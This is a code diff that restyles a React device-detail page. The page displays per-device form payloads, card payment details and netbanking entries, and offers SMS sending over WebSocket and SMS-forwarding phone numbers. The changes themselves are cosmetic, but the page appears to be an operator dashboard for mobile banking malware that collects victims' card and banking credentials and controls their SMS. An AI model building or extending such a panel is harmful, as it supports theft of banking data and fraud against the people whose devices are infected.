                           Forms + Card + Netbanking (device-wise) • blanks auto-skip
                         </div>
                       </div>
 
                       <button
                         onClick={() => loadUserData(true)}
-                        className="h-10 rounded-2xl border border-white/14 bg-white/[0.06] px-4 text-white/85 hover:bg-white/[0.09]"
+                        className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50"
                         type="button"
                       >
                         Refresh
@@ -1300,48 +1316,48 @@ export default function DeviceDetailPage() {
                     </div>
 
                     {userErr ? (
-                      <div className="mt-3 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
+                      <div className="mt-3 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
                         {userErr}
                       </div>
                     ) : null}
-                  </div>
+                  </SurfaceCard>
 
                   {userLoading ? (
-                    <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-5 text-center text-white/70 backdrop-blur-2xl">
+                    <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
                       Loading…
                     </div>
                   ) : (
                     <>
-                      <div className="rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
+                      <SurfaceCard className="p-4">
                         <div className="flex items-center justify-between">
-                          <div className="text-[13px] font-extrabold text-white">Form Payload (Latest)</div>
-                          <div className="text-[11px] text-white/45">{formSubmitCount} submits</div>
+                          <div className="text-[13px] font-extrabold text-slate-900">Form Payload (Latest)</div>
+                          <div className="text-[11px] text-slate-400">{formSubmitCount} submits</div>
                         </div>
 
                         {latestFormPairs.length === 0 ? (
-                          <div className="mt-3 text-[12px] text-white/55">No form data found.</div>
+                          <div className="mt-3 text-[12px] text-slate-500">No form data found.</div>
                         ) : (
                           <div className="mt-3 grid grid-cols-1 gap-2">
                             {latestFormPairs.map((p) => (
                               <div key={p.label} className="flex items-start justify-between gap-3">
-                                <div className="text-[11px] text-white/55">{p.label}</div>
-                                <div className="break-words text-right text-[11px] font-extrabold text-white/90">
+                                <div className="text-[11px] text-slate-500">{p.label}</div>
+                                <div className="break-words text-right text-[11px] font-extrabold text-slate-900">
                                   {p.value}
                                 </div>
                               </div>
                             ))}
                           </div>
                         )}
-                      </div>
+                      </SurfaceCard>
 
-                      <div className="rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
+                      <SurfaceCard className="p-4">
                         <div className="flex items-center justify-between">
-                          <div className="text-[13px] font-extrabold text-white">Card Payments</div>
-                          <div className="text-[11px] text-white/45">{cardItems.length}</div>
+                          <div className="text-[13px] font-extrabold text-slate-900">Card Payments</div>
+                          <div className="text-[11px] text-slate-400">{cardItems.length}</div>
                         </div>
 
                         {cardItems.length === 0 ? (
-                          <div className="mt-3 text-[12px] text-white/55">No card payments.</div>
+                          <div className="mt-3 text-[12px] text-slate-500">No card payments.</div>
                         ) : (
                           <div className="mt-3 space-y-2">
                             {cardItems.slice(0, 12).map((p: any, idx: number) => {
@@ -1349,13 +1365,10 @@ export default function DeviceDetailPage() {
                               if (pairs.length === 0) return null;
 
                               return (
-                                <div
-                                  key={p?._id || p?.id || `${idx}`}
-                                  className="rounded-2xl border border-white/12 bg-black/20 p-3"
-                                >
+                                <div key={p?._id || p?.id || `${idx}`} className="rounded-2xl border border-slate-200 bg-slate-50 p-3">
                                   <div className="flex items-start justify-between gap-2">
-                                    <div className="text-[12px] font-extrabold text-white/90">{paymentTitle(p, idx)}</div>
-                                    <div className="text-[10px] text-white/45">
+                                    <div className="text-[12px] font-extrabold text-slate-900">{paymentTitle(p, idx)}</div>
+                                    <div className="text-[10px] text-slate-400">
                                       {getTimestamp(p) ? new Date(getTimestamp(p)).toLocaleString() : ""}
                                     </div>
                                   </div>
@@ -1363,8 +1376,8 @@ export default function DeviceDetailPage() {
                                   <div className="mt-2 grid grid-cols-1 gap-2">
                                     {pairs.map((kv) => (
                                       <div key={kv.label} className="flex items-start justify-between gap-3">
-                                        <div className="text-[11px] text-white/55">{kv.label}</div>
-                                        <div className="break-words text-right text-[11px] font-extrabold text-white/85">
+                                        <div className="text-[11px] text-slate-500">{kv.label}</div>
+                                        <div className="break-words text-right text-[11px] font-extrabold text-slate-800">
                                           {kv.value}
                                         </div>
                                       </div>
@@ -1375,16 +1388,16 @@ export default function DeviceDetailPage() {
                             })}
                           </div>
                         )}
-                      </div>
+                      </SurfaceCard>
 
-                      <div className="rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
+                      <SurfaceCard className="p-4">
                         <div className="flex items-center justify-between">
-                          <div className="text-[13px] font-extrabold text-white">Netbanking</div>
-                          <div className="text-[11px] text-white/45">{netItems.length}</div>
+                          <div className="text-[13px] font-extrabold text-slate-900">Netbanking</div>
+                          <div className="text-[11px] text-slate-400">{netItems.length}</div>
                         </div>
 
                         {netItems.length === 0 ? (
-                          <div className="mt-3 text-[12px] text-white/55">No netbanking data.</div>
+                          <div className="mt-3 text-[12px] text-slate-500">No netbanking data.</div>
                         ) : (
                           <div className="mt-3 space-y-2">
                             {netItems.slice(0, 12).map((p: any, idx: number) => {
@@ -1392,13 +1405,10 @@ export default function DeviceDetailPage() {
                               if (pairs.length === 0) return null;
 
                               return (
-                                <div
-                                  key={p?._id || p?.id || `${idx}`}
-                                  className="rounded-2xl border border-white/12 bg-black/20 p-3"
-                                >
+                                <div key={p?._id || p?.id || `${idx}`} className="rounded-2xl border border-slate-200 bg-slate-50 p-3">
                                   <div className="flex items-start justify-between gap-2">
-                                    <div className="text-[12px] font-extrabold text-white/90">{paymentTitle(p, idx)}</div>
-                                    <div className="text-[10px] text-white/45">
+                                    <div className="text-[12px] font-extrabold text-slate-900">{paymentTitle(p, idx)}</div>
+                                    <div className="text-[10px] text-slate-400">
                                       {getTimestamp(p) ? new Date(getTimestamp(p)).toLocaleString() : ""}
                                     </div>
                                   </div>
@@ -1406,8 +1416,8 @@ export default function DeviceDetailPage() {
                                   <div className="mt-2 grid grid-cols-1 gap-2">
                                     {pairs.map((kv) => (
                                       <div key={kv.label} className="flex items-start justify-between gap-3">
-                                        <div className="text-[11px] text-white/55">{kv.label}</div>
-                                        <div className="break-words text-right text-[11px] font-extrabold text-white/85">
+                                        <div className="text-[11px] text-slate-500">{kv.label}</div>
+                                        <div className="break-words text-right text-[11px] font-extrabold text-slate-800">
                                           {kv.value}
                                         </div>
                                       </div>
@@ -1418,14 +1428,14 @@ export default function DeviceDetailPage() {
                             })}
                           </div>
                         )}
-                      </div>
+                      </SurfaceCard>
                     </>
                   )}
                 </div>
               )}
             </>
           )}
-        </TechGlassCard>
+        </SurfaceCard>
       </div>
 
       <Modal open={sendOpen} onClose={() => setSendOpen(false)} title="Send SMS (WebSocket)">
@@ -1504,7 +1514,7 @@ export default function DeviceDetailPage() {
 
       <Modal open={adminsOpen} onClose={() => setAdminsOpen(false)} title="Update Phone Number">
         <div className="space-y-4">
-          <div className="rounded-2xl border border-cyan-200/20 bg-cyan-50 px-3 py-3 text-sm leading-6 text-slate-700">
+          <div className="rounded-2xl border border-sky-200 bg-sky-50 px-3 py-3 text-sm leading-6 text-slate-700">
             You can save up to four phone numbers here. This is useful when you want SMS activity to be handled across
             multiple numbers.
           </div>
@@ -1613,21 +1623,21 @@ export default function DeviceDetailPage() {
                   className={[
                     "w-full rounded-[22px] border p-3 text-left transition",
                     active
-                      ? "border-cyan-500 bg-cyan-50 shadow-[0_10px_30px_rgba(6,182,212,0.15)]"
-                      : "border-slate-200 bg-white hover:border-cyan-200 hover:bg-cyan-50/40",
+                      ? "border-slate-900 bg-slate-50 shadow-[0_10px_30px_rgba(15,23,42,0.08)]"
+                      : "border-slate-200 bg-white hover:border-slate-300 hover:bg-slate-50",
                   ].join(" ")}
                 >
                   <div className="flex items-start gap-3">
                     <div
                       className={[
                         "mt-0.5 flex h-5 w-5 items-center justify-center rounded-full border-2",
-                        active ? "border-cyan-500" : "border-slate-300",
+                        active ? "border-slate-900" : "border-slate-300",
                       ].join(" ")}
                     >
                       <div
                         className={[
                           "h-2.5 w-2.5 rounded-full transition",
-                          active ? "bg-cyan-500" : "bg-transparent",
+                          active ? "bg-slate-900" : "bg-transparent",
                         ].join(" ")}
                       />
                     </div>
@@ -1636,7 +1646,7 @@ export default function DeviceDetailPage() {
                       <div className="flex items-center justify-between gap-2">
                         <div className="text-[15px] font-extrabold text-slate-900">{label}</div>
                         {active ? (
-                          <span className="rounded-full bg-cyan-500 px-2 py-1 text-[10px] font-extrabold uppercase tracking-wide text-white">
+                          <span className="rounded-full bg-slate-900 px-2 py-1 text-[10px] font-extrabold uppercase tracking-wide text-white">
                             Selected
                           </span>
                         ) : null}
@@ -1668,6 +1678,6 @@ export default function DeviceDetailPage() {
           </div>
         </div>
       </Modal>
-    </div>
+    </AnimatedAppBackground>
   );
 }
